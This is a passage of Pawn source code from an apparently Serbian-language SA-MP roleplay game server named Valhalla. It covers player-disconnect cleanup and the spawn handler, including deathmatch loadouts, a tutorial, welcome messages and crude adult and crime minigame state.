    antiCheatCS[ playerid ][ CPSCount ] = 0;
	antiCheatCS[ playerid ][ CPSTick ] = 0;
	antiCheatCS[ playerid ][ CWTime ] = 0;
    antiCheatCS[ playerid ][ CWVehID ] = -1;

    if( IsValidPlayerObject( playerid, farmerInfo[ playerid ][ fiBucketObject ] ) )
		DestroyPlayerObject( playerid, farmerInfo[ playerid ][ fiBucketObject ] );

    if( farmerInfo[ playerid ][ fiVehicleBucket ] != -1 ) {
		new farmvehicle = farmerInfo[ playerid ][ fiVehicleBucket ];

		farmerVehicles[ farmvehicle ][ fvMilk ] = false;
    	farmerVehicles[ farmvehicle ][ fvMilkpID ] = -1;
	}

    if( SearchNadji[ playerid ] != -1 ) {
		SearchNadji[ playerid ] = -1;
	    Novi_DisablePlayerCheckpoint( playerid);
	}

    if( ListaPrikazana[ playerid ] ) {
		KladionicaTDControl( playerid, false );
	}
    if( MojListicPrikazan[ playerid ] ) {
		KladionicaListicTDControl( playerid, false );
	}
	if( RezultatiPrikazana[ playerid ] ) {
		RezultatiTDControl( playerid, false );
	}

    if( PlayerInBlowJob[ playerid ] != 0 ) {

		switch( PlayerInBlowJob[ playerid ] ) {

	        case 1: {
	        
				DestroyActor( Sex_Lisa );
				WhoreLisa = false;
			}
	        case 2: {
	        
				DestroyActor( Sex_Angelina );
				WhoreAngelina = false;
			}
	        case 3: {
	        
				DestroyActor( Sex_Mia );
				WhoreMia = false;
			}
	        case 4: {
	        
				DestroyActor( Sex_Sendy );
				WhoreSendy = false;
			}
		}

		StopAudioStreamForPlayer( playerid );
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
    	SexTDControl( playerid, false );
    	BlowJobCount[ playerid ] = 0;
	    TogPlayerHud( playerid );
	    TogglePlayerControllable( playerid, ( true ) );
		ClearAnimations( playerid );
    	Novi_KillTimer( PusenjeTimer[ playerid ] );
	}

    switch( reason ) {
		case 0: {
			format( globalstring, sizeof( globalstring ), "** (( %s je napustio server ( crash ) ))", ImeIgraca( playerid ) );
			PorukaRadius( 60.0 , playerid, globalstring, 0xBFC0C2FF );
		}
		case 1: {
			format( globalstring, sizeof( globalstring ), "** (( %s je napustio server ( disconnect ) ))", ImeIgraca( playerid ) );
			PorukaRadius( 60.0 , playerid, globalstring, 0xBFC0C2FF );
		}
	}

    if( GetPVarInt( playerid, "Computer" ) == 1 ) {
        Police_TVTDControl( playerid, false );
        SetPVarInt( playerid, "Computer", 0 );
    }


    if( IgracSeRegistruje[ playerid ] == true ) RegisterTDControl( playerid, false );

	if( AdminVozilo[ playerid ] != -1 ) {

        Novi_DestroyVehicle( AdminVozilo[ playerid ] ); 
        AdminVozilo[ playerid ] = -1;
        printf("Unistio admin vozilo disconnect");
    } 

    if( helperVeh[ playerid ] != -1 ) Novi_DestroyVehicle( helperVeh[ playerid ] ), helperVeh[ playerid ] = -1;

    if( VPVeh[ playerid ] != -1 ) Novi_DestroyVehicle( VPVeh[ playerid ] ), VPVeh[ playerid ] = -1;

	if( TrkaVozilo[ playerid ] != -1 ) Novi_DestroyVehicle( TrkaVozilo[ playerid ] ), TrkaVozilo[ playerid ] = -1;

	if( HitmanInfo[ playerid ][ GotHit ] > 0) {
	    if( HitmanInfo[ playerid ][ GetChased ] < 999 ) {
	        if( IsPlayerConnected( HitmanInfo[ playerid ][ GetChased ] ) ){
	        	SCM( HitmanInfo[ playerid ][ GetChased ], ZUTA, "Vasa meta je izasla sa servera." );
	            HitmanInfo[ HitmanInfo[ playerid ][ GetChased ] ][ GoChase ] = 999;
			}
	    }
	}
	
	if( garbagemanInfo[ playerid ][ gmiJob ] == true ) {

		new vehicleid = garbagemanInfo[ playerid ][ gmiVehicleID ];

	    garbagemanVehicles[ vehicleid ][ gGarbages ] = 0;
     	garbagemanVehicles[ vehicleid ][ gPlayerID ] = -1;

     	SetVehicleToRespawn( vehicleid );
	}
	
	if( PlayerCement[ playerid ] != -1 ) VehCement[ PlayerCement[ playerid ] ] = false;
	
	PljackaNovac[ playerid ] = 0;
	VremeZaNovac[ playerid ] = 0;
	PljackaVreme[ playerid ] = 0;
	
	PljackaZlato[ playerid ] = 0;
	VremeZaZlato[ playerid ] = 0;
	ZlatoVreme[ playerid ] = 0;
	
	if( DragedPlayerID[ playerid ] != -1 ) {

		format( globalstring, sizeof( globalstring ), "%s je napustio server, pusteni ste.", ImeIgraca( playerid ) );
		SCM( DragedPlayerID[ playerid ], -1, globalstring );
		TogglePlayerControllable( DragedPlayerID[ playerid ], 1 );
		Draged[ DragedPlayerID[ playerid ] ] = -1;
	}
	
    if( farmerInfo[ playerid ][ fiFarmerPlantsPlanted ] != -1 ) {
    
        for( new plantid = 0; plantid < MAX_FARMS; plantid++ ) {
        
            if( plantInfo[ plantid ][ farmPlantCreated ] && plantInfo[ plantid ][ farmPlayerID ] == lastid ) {
            
                if( IsValidDynamic3DTextLabel( plantInfo[ plantid ][ farm3D ] ) )
					DestroyDynamic3DTextLabel( plantInfo[ plantid ][ farm3D ] );

				if( IsValidDynamicObject( plantInfo[ plantid ][ farmObject ] ) )
					DestroyDynamicObject( plantInfo[ plantid ][ farmObject ] );

				ResetFarmPlant( plantid );
            }
        }
    }

    PlayerTextDrawDestroy( playerid, PlayerGpsRadarText[ playerid ] );

    if( PitanjeBroj[ playerid ] != 0 ) Novi_KillTimer( TimerPitanje[ playerid ] );
    
    Novi_KillTimer( atmrobTimer[ playerid ] );
    
    if( PocetniTutorialStartovan[ playerid ] == true ) Novi_KillTimer( TimerTutorial[ playerid ] );
    
    Novi_KillTimer( FarbanjeTimer[ playerid ] );
    
    if( PlayerInfo[ playerid ][ xUbijen ] == 1 ) Novi_KillTimer( BolnicaTimer[ playerid ] );

	if( IgracPosadio[ playerid ] != 0 ) {
	    for( new plantid = 1; plantid < MAX_PLANTS; plantid++ ) {
	        if( strcmp( ImeIgraca( playerid ), DrogaStab[ plantid ][ wOwner ], true ) == 0 ) {
	            if( DrogaStab[ plantid ][ wPlanted ] == 1 ) {
					DrogaStab[ plantid ][ Plantx ] = 0;
					DrogaStab[ plantid ][ Planty ] = 0;
				   	DrogaStab[ plantid ][ Plantz ] = 0;
				   	DrogaStab[ plantid ][ wType ] = 0;
					DrogaStab[ plantid ][ wPlanted ] = 0;
					DrogaStab[ plantid ][ wHoursPassed ] = 0;
					strmid( DrogaStab[ plantid ][ wOwner ], "Niko", 0, strlen( "Niko" ), 255);
					DrogaStab[ plantid ][wViwo] = GetPlayerVirtualWorld( playerid );
				    DestroyDynamicObject( DrogaStab[ plantid ][ wObjectID ] );
				}
            }
		}
	}

    if( PlayerBuyingAS[ playerid ] != -1 ) {
 	    AutoSalon[ PlayerBuyingAS[ playerid ] ][ AlreadyBuying ] = false;
 	    PlayerBuyingAS[ playerid ] = -1;
	}

	antiCheatCS[ playerid ][ ArmedWeapon ] = 0;

	if( Rentano[ playerid ] != -1 ) {
	    Novi_KillTimer( RentTimer[ playerid ] );
	    VehicleObjectCheck( Rentano[ playerid ] );
    	SetVehicleToRespawn( Rentano[ playerid ] );
    	LinkVehicleToInterior( Rentano[ playerid ], 0 );
		Rentano[ playerid ] = -1;
	}

    if( PlayerCuffed[ playerid ] >= 1 ) {
		if( PlayerInfo[ playerid ][ xZatvor ] == 0 ) {
			PlayerInfo[ playerid ][ xZatvor ] = OBICAN_ZATVOR;
			PlayerInfo[ playerid ][ xZatvorVreme ] = 60;
			strmid( PlayerInfo[ playerid ][ xOffPJail ], "LTA", 0, strlen("LTA"), 64 );
		}
	}

	if( PlayerInfo[ playerid ][ xWanted ] > 0 ) {
		if( PlayerInfo[ playerid ][ xZatvor ] == 0 ) {
		    foreach( Player, i ) {
				if( IsPlayerConnected( i ) ) {
					if( GetFactionType( i ) == ORG_TIP_PD && CrimInRange( 40.0, playerid, i ) ) {
		
					    PlayerInfo[ playerid ][ xLeaveJail ] = true;
						PlayerInfo[ playerid ][ xZatvor ] = OBICAN_ZATVOR;
						PlayerInfo[ playerid ][ xZatvorVreme ] = 6*PlayerInfo[ playerid ][ xWanted ];
						new price = PlayerInfo[ playerid ][ xWanted ]*500;
						PlayerInfo[ playerid ][ xNovac ] -= price;
						PlayerInfo[ playerid ][ xWanted ] = 0;
					}
				}
			}
		}
	}

	if( GetFactionType( playerid ) == ORG_TIP_MD ) {
	    if( MedicDuty[ playerid ] == true ) { Medics -= 1; }
	}

	if( GetPVarInt(playerid, "BreakingLock") == 1 )
	{
	    Novi_KillTimer( GetPVarInt( playerid, "BreakLockTimer" ) );
	}

	if( GetPVarInt( playerid, "ImmobTimerCalled") == 1 )
	{
	    Novi_KillTimer( GetPVarInt( playerid, "immobcounttimer" ) );
	}

	if( GetPVarInt( playerid, "BreakLockTimerCalled" ) == 1 )
	{
		Novi_KillTimer( GetPVarInt( playerid, "breakcounttimer" ) );
	}


	if( BoomboxInfo[ playerid ][ boomboxPlaced ] ) {
        Boombox_Destroy( playerid );
    }

    if( antiCheatCS[ playerid ][ TakeVehicle ] != INVALID_VEHICLE_ID ) {
    	BusyVehicle[ antiCheatCS[ playerid ][ TakeVehicle ] ] = -1;
    }

	if( PlayerInfo[ playerid ][ xAdmin ] != 0 ) SacuvajAdmina( playerid );

	if( PlayerLogged[ playerid ] == true ) {
		SavePlayer( playerid );
	}

    if( Uciskolu[ playerid ] == true ) { Novi_KillTimer( SkolaTimer[ playerid ] ); }

    if( CistacPosao[ playerid ] == true )  { Novi_KillTimer( CistacTimer[ playerid ] ); }

    if( TrashSearch[ playerid ] == 1 )  { Novi_KillTimer( TrashTimer[ playerid ] ); }

    if( GetPVarInt( playerid, "RequestingBackup" ) == 1 ) {
		Novi_KillTimer( backuptimer[ playerid ] );
		BackupClear( playerid, 0 );
	}
    if( offeredByCabbie[ playerid ] != INVALID_PLAYER_ID )
	{
		TaximetarUkljucen[ offeredByCabbie[ playerid ] ] = false;

        PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ], "N/A" );
        PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ] );
		PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ], "N/A" );
		PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ] );

		CenaVoznje[ offeredByCabbie[ playerid ] ] = 0;
		VoziIgracaID[ offeredByCabbie[ playerid ] ] = INVALID_PLAYER_ID;
		Novi_KillTimer( TaxiTimer[ offeredByCabbie[ playerid ] ] );
		offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
	}

    if( GetPVarInt( playerid, "CuffTimerCalled") == 1 )
	{
	    Novi_KillTimer( TazerTimer[ playerid ] );
	}

    if( AdminDuty[ playerid ] ) {
    	AdminDuty[ playerid ] = false;
	}

	if( KrenuoKosenje[ playerid ] )
		for( new i = 0; i < 38; i++)
			if( IsValidPlayerObject( playerid, Grass[ i ][ playerid ] ) ) DestroyPlayerObject( playerid, Grass[ i ][ playerid ] );
	return true;
}

UpdateBankTD( playerid ) {
    new stringic[ 28 ];
	if( PlayerInfo[ playerid ][ xImaBRacun ] == false ) {
	    PlayerTextDrawSetString( playerid, BankaIgraca[ playerid ], "No Bank Account" );
    }
    else {
        format( stringic, sizeof( stringic ), "BANKA:_%d$", PlayerInfo[ playerid ][ xBRacun ] );
	    PlayerTextDrawSetString( playerid, BankaIgraca[ playerid ], stringic );
    }
}

UpdateZlatoTD( playerid ) {
    new stringic[ 28 ];
	format( stringic, sizeof( stringic ), "ZLATO:_%dg", PlayerInfo[ playerid ][ xZlato ] );
	PlayerTextDrawSetString( playerid, ZlatoIgraca[ playerid ], stringic );
}

SetPlayerTDStats( playerid ) {

    new stringic[ 40 ];


	if( PlayerInfo[ playerid ][ xImaBRacun ] == false ) {
	    PlayerTextDrawSetString( playerid, BankaIgraca[ playerid ], "No Bank Account" );
    }
    else {
        format( stringic, sizeof( stringic ), "%d$", PlayerInfo[ playerid ][ xBRacun ] );
	    PlayerTextDrawSetString( playerid, BankaIgraca[ playerid ], stringic );
    }
	
	format( stringic, sizeof( stringic ), "%dg", PlayerInfo[ playerid ][ xZlato ] );
	PlayerTextDrawSetString( playerid, ZlatoIgraca[ playerid ], stringic );

    // format( stringic, sizeof(stringic), "DO_PLATE:_%d_MIN", (60-PlayerInfo[ playerid ][ xPayDay ]));
    // PlayerTextDrawSetString(playerid, DoPlateTD[playerid], stringic);

    // format( stringic, sizeof( stringic ), "%d$", PlayerInfo[ playerid ][ xPrljavNovac ] );
    // PlayerTextDrawSetString( playerid, PrljavNovacTD[ playerid ], stringic );
	PlayerTextDrawShow( playerid, BankaIgraca[ playerid ] );
    PlayerTextDrawShow( playerid, ZlatoIgraca[ playerid ] );
    // PlayerTextDrawShow(playerid, DoPlateTD[playerid]);
    // PlayerTextDrawShow( playerid, PrljavNovacTD[ playerid ] );

    Novi_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
}

stock DonatorBoja( playerid ) {

	if( PlayerInfo[ playerid ][ xDBO ] ) {
	
		if( PlayerInfo[ playerid ][ xDBoja ] == 1 ) {
		
			SetPlayerColor(playerid, 0xFF808000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 2 ) {
		
			SetPlayerColor(playerid, 0xFF000000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 3 ) {
		
			SetPlayerColor(playerid, 0x80FFFF00 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 4 ) {
		
			SetPlayerColor(playerid, 0xFF804000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 5 ) {
		
			SetPlayerColor(playerid, 0xFF62B000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 6 ) {
		
			SetPlayerColor(playerid, 0xC0C0C000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 7 ) {
		
			SetPlayerColor(playerid, 0x00FF0000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 8 ) {
		
			SetPlayerColor(playerid, 0xFFFF0000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 9 ) {
		
			SetPlayerColor(playerid, 0x00800000 );
		}
		if( PlayerInfo[ playerid ][ xDBoja ] == 10 ) {
		
			SetPlayerColor(playerid, 0x0000FF00 );
		}
	}
}

public OnPlayerSpawn( playerid ) {

    if(IsPlayerNPC(playerid)) return 1;

    WastedTDControl(playerid, false);
    defer wastedTDCheck(playerid);

    if(gDeathList[playerid] && PlayerInfo[playerid][xAdmin] >= 1)
    {
        TextDrawShowForPlayer(playerid, tdDeathList[0]);
        TextDrawShowForPlayer(playerid, tdDeathList[1]);
        TextDrawShowForPlayer(playerid, tdDeathList[2]);
    }

    // if(nosiKapicu[playerid]) {

    //     kapicaControl(playerid, true);
    // }

    PostaviStamina(playerid);

    if( WARPInfo[ playerid ][ warID ] != -1 ) {
        new w = WARPInfo[ playerid ][ warID ];

        SetPlayerVirtualWorld( playerid, w );
        SetPlayerHealth( playerid, 100 );
        if( WARInfo[ w ][ warMap ] == 1 ) {
            new rand1 = random( sizeof( warMap1Team1 ) );
            new rand2 = random( sizeof( warMap1Team2 ) );
            if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { SetPlayerPos( playerid, warMap1Team1[ rand1 ][ 0 ], warMap1Team1[ rand1 ][ 1 ],warMap1Team1[ rand1 ][ 2 ] ); }
            else if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { SetPlayerPos( playerid, warMap1Team2[ rand2 ][ 0 ], warMap1Team2[ rand2 ][ 1 ],warMap1Team2[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 0 );
        }
        else if( WARInfo[ w ][ warMap ] == 2 ) {
            new rand1 = random( sizeof( warMap2Team1 ) );
            new rand2 = random( sizeof( warMap2Team2 ) );
            if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { SetPlayerPos( playerid, warMap2Team1[ rand1 ][ 0 ], warMap2Team1[ rand1 ][ 1 ],warMap2Team1[ rand1 ][ 2 ] ); }
            else if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { SetPlayerPos( playerid, warMap2Team2[ rand2 ][ 0 ], warMap2Team2[ rand2 ][ 1 ],warMap2Team2[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 10 );
        }
        else if( WARInfo[ w ][ warMap ] == 3 ) {
            new rand1 = random( sizeof( warMap3Team1 ) );
            new rand2 = random( sizeof( warMap3Team2 ) );
            if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { SetPlayerPos( playerid, warMap3Team1[ rand1 ][ 0 ], warMap3Team1[ rand1 ][ 1 ],warMap3Team1[ rand1 ][ 2 ] ); }
            else if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { SetPlayerPos( playerid, warMap3Team2[ rand2 ][ 0 ], warMap3Team2[ rand2 ][ 1 ],warMap3Team2[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 0 );
        }
        else if( WARInfo[ w ][ warMap ] == 4 ) {
            new rand1 = random( sizeof( warMap4Team1 ) );
            new rand2 = random( sizeof( warMap4Team2 ) );
            if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { SetPlayerPos( playerid, warMap4Team1[ rand1 ][ 0 ], warMap4Team1[ rand1 ][ 1 ], warMap4Team1[ rand1 ][ 2 ] ); }
            else if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { SetPlayerPos( playerid, warMap4Team2[ rand2 ][ 0 ], warMap4Team2[ rand2 ][ 1 ], warMap4Team2[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 0 );
        }
        else if( WARInfo[ w ][ warMap ] == 5 ) {
            new rand1 = random( sizeof( warMap5Team1 ) );
            new rand2 = random( sizeof( warMap5Team2 ) );
            if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { SetPlayerPos( playerid, warMap5Team1[ rand1 ][ 0 ], warMap5Team1[ rand1 ][ 1 ],warMap5Team1[ rand1 ][ 2 ] ); }
            else if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { SetPlayerPos( playerid, warMap5Team2[ rand2 ][ 0 ], warMap5Team2[ rand2 ][ 1 ],warMap5Team2[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 0 );
        }
        else if( WARInfo[ w ][ warMap ] == 6 ) {
            new rand1 = random( sizeof( warMap6Team1 ) );
            new rand2 = random( sizeof( warMap6Team2 ) );
            if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) { SetPlayerPos( playerid, warMap6Team1[ rand1 ][ 0 ], warMap6Team1[ rand1 ][ 1 ],warMap6Team1[ rand1 ][ 2 ] ); }
            else if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) { SetPlayerPos( playerid, warMap6Team2[ rand2 ][ 0 ], warMap6Team2[ rand2 ][ 1 ],warMap6Team2[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 0 );
        }
        GiveWeaponToPlayer( playerid, WARInfo[ w ][ warGuns ][ 0 ], 300 );
        GiveWeaponToPlayer( playerid, WARInfo[ w ][ warGuns ][ 1 ], 300 );
        GiveWeaponToPlayer( playerid, WARInfo[ w ][ warGuns ][ 2 ], 300 );
        GiveWeaponToPlayer( playerid, WARInfo[ w ][ warGuns ][ 3 ], 300 );
        return true;
    }

    if(UTutorialu[playerid])
    {
        ClearChat(playerid, 25);
        SetCameraBehindPlayer(playerid);
        TogglePlayerControllable(playerid, 1);
        PostaviSkin(playerid, 72);
        Novi_SetPlayerPos(playerid, 2309.4019,-1195.1851,25.1111);
        //SetPlayerWorldBounds(playerid, 2300, -1206, 2351.40, -1184); Ovo srediti koordinate
        Novi_SetPlayerCheckpoint(playerid, 2339.2600,-1203.2943,27.9766, 3.0);
        TutorialMessage(playerid, "Idi na checkpoint i popricaj sa starim prijateljem!");
        TutorialCP[playerid] = 1;
        return 1;
    }

    PreloadAnimations( playerid );
    SetPlayerColor( playerid, 0xFFFFFF00 );
    for( new i = 0; i < 13; i++ ) {
		antiCheatCS[ playerid ][ Weapon ][ i ] = 0;
		antiCheatCS[ playerid ][ Ammo ][ i ] = 0;
	}
    
    SetPlayerTDStats( playerid );
    PocetniNovac( playerid, PlayerInfo[ playerid ][ xNovac ] );
	SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
    PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
    SetPlayerInterior( playerid, 0 );
    SetPlayerVirtualWorld( playerid, 0 );

    TextDrawHideForPlayer(playerid, BlackTD);
    
    antiCheatCS[ playerid ][ TeleportCheck ] = 4;
    antiCheatCS[ playerid ][ WeaponDetect ] = 4;
    antiCheatCS[ playerid ][ EnteredVehicle ] = INVALID_VEHICLE_ID;
    
    if( AdminVozilo[ playerid ] != -1 ) Novi_DestroyVehicle( AdminVozilo[ playerid ] ), AdminVozilo[ playerid ] = -1;

    if( helperVeh[ playerid ] != -1 ) Novi_DestroyVehicle( helperVeh[ playerid ] ), helperVeh[ playerid ] = -1;

    if( VPVeh[ playerid ] != -1 ) Novi_DestroyVehicle( VPVeh[ playerid ] ), VPVeh[ playerid ] = -1;

    if( TrkaVozilo[ playerid ] != -1 ) Novi_DestroyVehicle( TrkaVozilo[ playerid ] ), TrkaVozilo[ playerid ] = -1;
    
    DonatorBoja( playerid );
    
    for( new id = 1; id < MAX_GZONE; id++ ) {

        new filename[ 32 ], stringic[ 24 ];
		format( filename, sizeof( filename ), F_GZONE, id );

		if( fexist( filename ) ) {

            format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ id ][ gZoneColor ] );
		    GangZoneShowForPlayer( playerid, gZoneInfo[ id ][ gZoneID ], HexToInt( stringic ) );

		}
	}
    
	
    if( NaDmEventu[ playerid ] == true ) {
        
        new rand = random( sizeof( RandomDMPos ) );
		Novi_SetPlayerPos( playerid, RandomDMPos[ rand ][ 0 ], RandomDMPos[ rand ][ 1 ],RandomDMPos[ rand ][ 2 ] );
		SetPlayerFacingAngle( playerid, 360.000 );
		SetCameraBehindPlayer( playerid );
		SetPlayerInterior( playerid, 0 );
		SetPlayerVirtualWorld( playerid, 10 );
		Novi_SetPlayerHealth( playerid, 150 );
		Novi_SetPlayerArmour( playerid, 100 );

        PlayerInfo[ playerid ][ xSpawned ] = 1;

		if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 ) {
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 26, 150 );
			GiveWeaponToPlayer( playerid, 28, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 999 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4000 ) {
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 27, 150 );
			GiveWeaponToPlayer( playerid, 32, 800 );
			GiveWeaponToPlayer( playerid, 31, 400 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3500 ) {
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 27, 150 );
			GiveWeaponToPlayer( playerid, 28, 800 );
			GiveWeaponToPlayer( playerid, 31, 400 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3000 ) {
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 27, 150 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2500 ) {
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 26, 150 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2000 ) {
			GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 26, 150 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 30, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1500 ) {
			GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 25, 100 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1000 ) {
			GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 25, 100 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 30, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 500 ) {
			GiveWeaponToPlayer( playerid, 24, 200 );
			GiveWeaponToPlayer( playerid, 25, 100 );
			GiveWeaponToPlayer( playerid, 29, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 0 ) {
			GiveWeaponToPlayer( playerid, 24, 200 );
			GiveWeaponToPlayer( playerid, 25, 100 );
		}
		
		Novi_SetPlayerHealth( playerid, 150 );
		Novi_SetPlayerArmour( playerid, 100 );
        return true;
    }
    else {
    
        PlayerInfo[ playerid ][ xSpawned ] = 1;
    	PostaviSpawn( playerid );
	}

    PlayerInfo[ playerid ][ xSpawned ] = 1;

	
    if( PlayerInfo[ playerid ][ xWanted ] != 0 ) {
        strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nepoznato", 0, strlen( "Nepoznato" ), 255);
		strmid( ZlocinInfo[ playerid ][ zPocinio ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
		strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nepoznato", 0, strlen( "Nepoznato" ), 255);
		Novi_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
	}
    if( PrviSpawn[ playerid ] == 1 ) {
    
        if( PlayerLogged[ playerid ] == true ) {
        
			new h,mi,sec;
			gettimeEx(h,mi,sec);
			FixHour( h );
			h = shifthour;
			StopAudioStreamForPlayer( playerid );
			SCM( playerid, BELA, "- - - - - - - - - - - - - - - - - - "SRVBOJA1SCM"Valhalla "col_white"Roleplay - - - - - - - - - - - - - - - - - -");
			SendClientMessageEx( playerid, BELA, ""col_white"Zdravo, "col_crvena"%s"col_white".", ImeIgraca( playerid ) );
			SCM( playerid, BELA, ""col_white"Dobrodosao na "SRVBOJA1SCM"Valhalla.");
			SCM( playerid, BELA, ""col_white"Forum "col_crvena"|"col_white" www."SRVBOJA1SCM"valhalla-ogc"col_white".com"col_crvena"" );
            SendClientMessageEx( playerid, -1, ""col_white"Level: "col_crvena"%d "col_white"| Novac u dzepu: "col_crvena"$%d "col_white"| Novac u banci: "col_crvena"$%d"col_white".", PlayerInfo[ playerid ][ xLevel ], GetPlayerMoney( playerid ), PlayerInfo[ playerid ][ xBRacun ] );
            if( ServerInfo[ HappyHours ] == true ) {
                SCM( playerid, BELA, ""col_white"Trenutno su na serveru ukljuceni "col_crvena"srecni sati." );
            }
			SCM( playerid, SRVBOJA1, "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");

            //if(PlayerInfo[playerid][xMichaelMisijaSpawn] == 0) { defer MichaelMisijaPoziv(playerid); }

			if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
		    	SendClientMessageEx( playerid, BELA, ""col_white"|:."SRVBOJA1SCM"Valhalla "col_white"Roleplay:.| Ulogovan si kao "col_crvena"%d "col_white"Level Admin-a!", PlayerInfo[ playerid ][ xAdmin ] );

				if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) {
				    foreach( Player, i ) {
					    if( PlayerInfo[ i ][ xAdmin ] >= 1 ) {
					        format( globalstring, sizeof( globalstring ), "|Admin||%d| %s usao na server!", PlayerInfo[ playerid ][ xAdmin ], ImeIgraca( playerid ) );
                            SCM( i, 0x6495EDAA, globalstring );
						}
					}
				}
				else if( PlayerInfo[ playerid ][ xAdmin ] >= 7 ) {
				    foreach( Player, i ) {
						if( PlayerInfo[ i ][ xAdmin ] >= 7 ) {
					        format( globalstring, sizeof( globalstring ), "|Vlasnik| %s usao na server!", ImeIgraca( playerid ) );
							SCM( i, 0xFF6347AA, globalstring );
						}
					}
				}
			}
			else if( PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
		    	SendClientMessageEx( playerid, BELA, ""col_white"|:."SRVBOJA1SCM"Valhalla "col_white"Roleplay:.| Logiran si kao "col_crvena"%d "col_white"Level Helper-a!", PlayerInfo[ playerid ][ xSupporter ] );
				format( globalstring, sizeof( globalstring ), "|Helper||%d| %s usao na server!", PlayerInfo[ playerid ][ xSupporter ], ImeIgraca( playerid ) );
                RPTChat( 0x32CD32AA, globalstring );
			}
			
			if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1 ) {
			
			    if(strcmp( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vOwner ], ImeIgraca( playerid ), true ) ) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Vozilo 1 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
